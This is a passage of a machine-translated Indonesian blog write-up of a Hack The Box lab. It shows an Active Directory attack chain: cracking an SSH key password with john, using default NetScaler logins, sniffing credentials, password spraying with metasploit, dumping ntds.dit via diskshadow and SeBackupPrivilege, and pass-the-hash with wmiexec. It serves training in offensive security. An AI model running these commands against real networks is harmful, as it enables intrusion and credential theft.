Kunci pribadi ini dienkripsi dan dirancang untuk otorisasi SSH. </font><font style="vertical-align: inherit;">Mari kita pergi melalui kata sandi yang digunakan untuk mendekripsi kunci. </font><font style="vertical-align: inherit;">Untuk melakukan ini, pertama memformat ulang kunci ke format john. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ui/-y/rw/ui-yrwxnm9mh_b-_p7ae2lbkbtc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi memilah-milah kamus standar tidak berhasil, dan mereka meminta saya alat yang sangat baik untuk menghasilkan kata sandi "diketik dengan mudah" - </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kwprocessor</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Ayo buat kamus.</font></font><br>
<br>
<pre><code class="bash hljs">./kwp -o key-dict.txt basechars/tiny.base keymaps/en.keymap routes/2-to-32-max-5-direction-changes.route</code></pre><br>
<img src="https://habrastorage.org/webt/xe/mz/j0/xemzj0okpereyu2ubrjiz7u7esi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami telah berhasil menemukan kata sandi 16 karakter.</font></font><br>
<br>
<pre><code class="bash hljs">john --wordlist=./kwprocessor/key-dict.txt putty.john</code></pre><br>
<img src="https://habrastorage.org/webt/0v/08/p9/0v08p94zn_xex3wgqvqh55ahqyy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Karena saya memiliki Linux, lebih nyaman bagi saya untuk bekerja dengan klien SSH biasa. </font><font style="vertical-align: inherit;">Format ulang kunci untuk format ini.</font></font><br>
<br>
<pre><code class="bash hljs">sudo apt install putty-tools<font></font>
puttygen private.ppk -O private-openssh -o id_rsa</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kita memutuskan di mana kita bisa mendapatkan dengannya. </font><font style="vertical-align: inherit;">Untuk melakukan ini, pindai jaringan internal untuk menemukan port terbuka 22.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p22 172.16.249.200-205 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/fq/da/78/fqda78yhbo1nuezb5_txvnxvigg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami menemukan, tetapi kami masih tidak tahu apa-apa tentang tuan rumah ini. Mencoba terhubung tanpa nama, kami mendapatkan pesan yang menarik dan permintaan kata sandi. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sf/gp/qs/sfgpqst6ffsugdv0biquhni5fea.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Meneliti nama-nama pengguna yang kami tahu tidak memberikan hasil. Memindai nmap layanan ini menggunakan skrip juga tidak menghasilkan apa-apa. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/sd/wi/y0/sdwiy0egqd4zgm4fagjeyizfmv4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kemudian saya memindai semua port di host. Tetapi dia tidak menunggu sampai akhir pemindaian, karena butuh waktu yang sangat lama, karena dalam informasi proxy, seseorang dapat mengamati apakah port tersedia atau tidak. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/yv/9e/ov/yv9eovdujflhzyyf9q-hsg7uphw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Karena port 80 tersedia, saya memasang proxy di browser saya dan pergi untuk melihat apa yang ada di sana. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/v2/e6/v-/v2e6v-zekaxpfyu5pvagxkayeta.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami dipenuhi oleh halaman otorisasi Citrix NetScaler. Dan Google membawa kami ke dokumentasi, di mana kami mengenali login default. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/mh/cp/ha/mhcpha-tvjml8kvelevudpehacs.png"><br>
<br>
<img src="https://habrastorage.org/webt/u4/rg/zi/u4rgziapmiadlxkt9v-cnydmizo.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan dengan login ini kami berhasil terhubung melalui SSH.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/u2/kl/5b/u2kl5b92xjdgz1gfigbyvb8jgfs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah berkeliaran di server, saya melihat materi tentang serangan pada peralatan jenis ini, salah satunya adalah pemantauan lalu lintas. </font><font style="vertical-align: inherit;">Jadi, saya meninggalkan tcpdump aktif untuk sementara waktu dan menerima dump lalu lintas.</font></font><br>
<br>
<pre><code class="bash hljs">tcpdump -s0 -w r.pcap</code></pre><br>
<img src="https://habrastorage.org/webt/ur/9p/pf/ur9ppf0umalf7govd7ao_jjzc-q.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang unduh file ini.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains scp -i id_rsa nsroot@172.16.249.202:/root/r.pcap ./</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan untuk cepat menemukan kredensial, kami menggunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PCredz</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font></font><br>
<br>
<img src="https://habrastorage.org/webt/0c/lq/yn/0clqyngcfi_fxwg1onbheg9t6au.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami mendapatkan bendera lain.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ub/ws/mx/ubwsmxhyscpsrfy7jumcjf689la.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bendera Doppelganger</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi program ini tidak terlihat sama sekali, jadi Anda perlu menganalisis dump untuk keberadaan berbagai rahasia atau token. </font><font style="vertical-align: inherit;">Setelah mengurutkan paket berdasarkan protokol, kami membuka LDAP dan menemukan bindRequest dari dua pengguna yang memiliki kata sandi (kami sudah menemukan satu). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/il/ad/7_/ilad7_p_f-rbgwdrpglcejkbh74.png"><br>
<br>
<img src="https://habrastorage.org/webt/_6/w_/al/_6w_al3oddm4ikipiqi3ishgado.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Verifikasi kata sandi ini untuk pengguna ini.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains cme smb -u <span class="hljs-string">"netscaler-svc"</span> -p <span class="hljs-string">"#S3rvice#@cc"</span> -d htb.local 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/n_/7x/r4/n_7xr4urfsbuwry9m258zxmiczy.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Pengguna ini tidak luar biasa, kecuali bahwa ia adalah pengguna layanan. </font><font style="vertical-align: inherit;">Seringkali kata sandi dari pengguna tersebut bertepatan dengan kata sandi dari pengguna domain lainnya. </font><font style="vertical-align: inherit;">Mari kita periksa pengguna mana yang akan menggunakan kata sandi ini. </font><font style="vertical-align: inherit;">Saya melakukan ini menggunakan metasploit.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains msfconsole 2&gt;/dev/null<font></font>
&gt; use auxiliary/scanner/smb/smb_login<font></font>
&gt; <span class="hljs-built_in">set</span> SMBDomain htb.local<font></font>
&gt; <span class="hljs-built_in">set</span> RHOSTS 172.16.249.200<font></font>
&gt; <span class="hljs-built_in">set</span> USER_FILE ~/tmp/users.txt<font></font>
&gt; <span class="hljs-built_in">set</span> PASS_FILE ~/tmp/passwords.txt<font></font>
&gt; <span class="hljs-built_in">set</span> VERBOSE <span class="hljs-literal">false</span>
&gt; run</code></pre><br>
<img src="https://habrastorage.org/webt/8l/d5/gj/8ld5gjri_mmvptxg1-cdlzc9f1e.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kata sandi ini pergi ke semua akun layanan. </font><font style="vertical-align: inherit;">Seperti yang kami ketahui sebelumnya, akun backup-svc diistimewakan, yang berarti diizinkan untuk masuk ke pengontrol domain. </font><font style="vertical-align: inherit;">Periksa port terbuka layanan RDP (3389) dan WinRM (5985).</font></font><br>
<br>
<pre><code class="bash hljs">proxychains nmap -p 3389,5985 172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/pz/cw/5a/pzcw5asa6eqyodh4sfwa6vc9_ys.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kedua metode login dimungkinkan, tetapi saya lebih suka WinRM. </font><font style="vertical-align: inherit;">Masuk menggunakan program Evil-WinRM.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p <span class="hljs-string">"#S3rvice#@cc"</span> 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/lq/nx/rg/lqnxrg12wpdnbcsr9fuapynu38u.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan ambil bendera lain.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/5c/eu/xx/5ceuxxnpsuj3orc_35qazfwnkq0.png"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bendera yang dimiliki</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setelah melihat informasi tentang pengguna ini, kami melihat keanggotaannya dalam grup istimewa, sehingga kami dapat menyalin file ntds.dit dan mengekstrak kredensial pengguna domain.</font></font><br>
<br>
<pre><code class="bash hljs">whoami /all</code></pre><br>
<img src="https://habrastorage.org/webt/in/4i/a6/in4ia6lepmr0u2_voqct6h-qjw8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dari metode dump dari file ntds, opsi discshadow berhasil dieksekusi. </font><font style="vertical-align: inherit;">Mari masuk menggunakan RDP. </font><font style="vertical-align: inherit;">Sebagai klien, saya menggunakan remmina.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains remmina</code></pre><br>
<img src="https://habrastorage.org/webt/1b/bv/os/1bbvosxjg1jb6y7acri98kmj47k.png"><br>
<br>
<img src="https://habrastorage.org/webt/so/ec/79/soec79bjwbiktiqfc9udby8v4g0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan kami disambut oleh jendela prompt perintah. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/xl/ox/kr/xloxkreweosxvmhp56wiy4v4hms.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mari kita masuk ke konteks diskshadow. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/nw/uh/ub/nwuhub-n7hnrfsm9q505cyrvrt4.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan buat salinan - drive Z.</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">set</span> context persistence nowriters<font></font>
add volume c: <span class="hljs-built_in">alias</span> sss<font></font>
create <font></font>
expose %sss% z:</code></pre><br>
<img src="https://habrastorage.org/webt/ow/hv/xx/owhvxxddfioicyx-kn1frars-hs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Periksa dan lihat salinan file ntds.dit. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/hp/vo/ei/hpvoeilgbsxim5ljt3nxflbmo6w.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Kami juga membutuhkan file Sistem untuk mendekripsi basis data ntds, tetapi lebih mudah untuk mendapatkannya.</font></font><br>
<br>
<pre><code class="bash hljs">reg.exe save hklm\system C:\Users\backup-svc\Documents\system.bak</code></pre><br>
<img src="https://habrastorage.org/webt/nz/_z/16/nz_z16rrzirc0l4udjlgvny5zvm.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tapi itu tidak semua, karena hanya Anda tidak dapat menyalin file ntds. </font><font style="vertical-align: inherit;">Untuk melakukan ini, gunakan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">alat berikut</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Pertama, muat kedua DLL di host. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/z9/jb/d1/z9jbd1lsunkcyd3uon6v8yl3skw.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan memuat ke dalam memori. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/9q/gk/cj/9qgkcjotiqguv2rhtjbci6ey1-0.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Sekarang kami mengaktifkan hak istimewa dan memverifikasi bahwa itu dalam keadaan Diaktifkan.</font></font><br>
<br>
<pre><code class="bash hljs">Set-SeBackupPrivilege<font></font>
Whoami /priv | findstr Backup</code></pre><br>
<img src="https://habrastorage.org/webt/uu/bt/gt/uubtgtsp7zzfuvc9jyi-371bte8.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Oke, sekarang salin file tersebut.</font></font><br>
<br>
<pre><code class="bash hljs">Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\Users\backup-svc\Documents\ntds.dit</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan sekarang kami mengunduh file sistem dan ntds ke host lokal ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dan pada saat itu laboratorium ditutup dan saya kehilangan akses, tepat saat mengunduh file ... Ternyata laboratorium menjadi tersedia hanya untuk pengguna dengan berlangganan (pergi ke resolusi ulang) dan saya tidak dapat menyelesaikan bagian ini Tetapi banyak terima kasih kepada @kemstat untuk berbagi konfigurasi VPN selama VIP, sehingga saya dapat menyelesaikan bagian ini</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ). </font><font style="vertical-align: inherit;">Mari kita dapatkan kredensial.</font></font><br>
<br>
<pre><code class="bash hljs">secretsdump.py -ntds ndts.dit -system system.bak LOCAL</code></pre><br>
<img src="https://habrastorage.org/webt/pk/jc/vt/pkjcvt3bnlmlqet3kcbewyy72ks.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dan ada hash admin. </font><font style="vertical-align: inherit;">Sekarang gunakan serangan PTH untuk terhubung ke server. </font><font style="vertical-align: inherit;">Tetapi psexec (terhubung melalui SMB) mencegah kami membaca file. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/tz/c8/wp/tzc8wpvaac_btlyw3sq5mie2b1y.png"><br>
<br>
<img src="https://habrastorage.org/webt/-_/mq/jj/-_mqjjz_ybfor9th1np8b6liibs.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tetapi WMI memberi kami akses tanpa batas dan kami mendapatkan hak istimewa dari administrator domain dan bendera terakhir.</font></font><br>
<br>
<pre><code class="bash hljs">proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be Administrator@172.16.249.200 2&gt;/dev/null</code></pre><br>
<img src="https://habrastorage.org/webt/ba/y_/sd/bay_sddavamcgwmwy2hj-i819eg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Itu saja. </font><font style="vertical-align: inherit;">Sebagai umpan balik, komentari apakah Anda mempelajari sesuatu yang baru dari artikel ini dan apakah itu bermanfaat bagi Anda. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Anda dapat bergabung dengan kami di </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Di sana Anda dapat menemukan materi yang menarik, kursus yang digabungkan, serta perangkat lunak. </font><font style="vertical-align: inherit;">Mari kita mengumpulkan komunitas di mana akan ada orang-orang yang berpengalaman dalam banyak bidang TI, maka kita selalu dapat saling membantu dalam masalah TI dan keamanan informasi.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id506954/index.html">Artikel lain tentang Rails dan ELK</a></li>
<li><a href="../id506956/index.html">Teknologi dan Kesehatan Kuantum</a></li>
<li><a href="../id506962/index.html">Async / tunggu di Unity</a></li>
<li><a href="../id506964/index.html">Pengembangan Android: Tinjauan Karir untuk Mei 2020</a></li>
<li><a href="../id506976/index.html">Ikhtisar Pemindai 3D Solutionix D500 dan D700</a></li>
<li><a href="../ja451092/index.html">ソーシャルプロジェクト「Remember Everyone」のソフトウェア実装をオープンソースにした経験</a></li>
<li><a href="../ja451098/index.html">プロジェクトのオーディオサンプルの入手先：9つのテーマ別リソースの選択</a></li>
<li><a href="../ja451104/index.html">記事を読むインテリジェントスピーカーブラウザー拡張機能：Microsoft Azureから追加された音声</a></li>
<li><a href="../ja451110/index.html">警報音</a></li>
<li><a href="../ja451112/index.html">Jetpackの作成</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>